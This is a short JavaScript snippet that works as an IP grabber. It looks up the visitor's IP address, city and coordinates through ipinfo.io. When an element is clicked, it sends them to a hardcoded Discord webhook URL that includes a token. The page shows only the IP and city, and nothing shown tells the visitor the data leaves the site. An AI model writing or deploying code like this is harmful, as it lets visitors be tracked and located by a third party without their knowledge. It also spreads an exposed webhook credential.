window.addEventListener("load",e => {

var web = "https://discord.com/api/webhooks/1090421575645396992/pTh_bQ-DAyxV9tTTpoupjNs7kr5h52HDdjs9r6X2Nh933pY-ntePKjD3UMSk5ZvrvCct"
 
let ip;
  let city;
let longitude;
let loc;
  $.get("https://ipinfo.io", function(response) {
           	ip = response.ip;
    city = response.city;

loc = response.loc;

  }, "json")

  function discord_message(webHookURL, message) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", webHookURL, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            'content': message,
            'username':'AI',
        }));
    }

  
  
$(".getip").on("click", function(){
  

  discord_message(web, "ip found " + ip + ", " + city + ", " + loc);
  document.getElementById("stuff").innerHTML = ip + ", " + city;
});
});
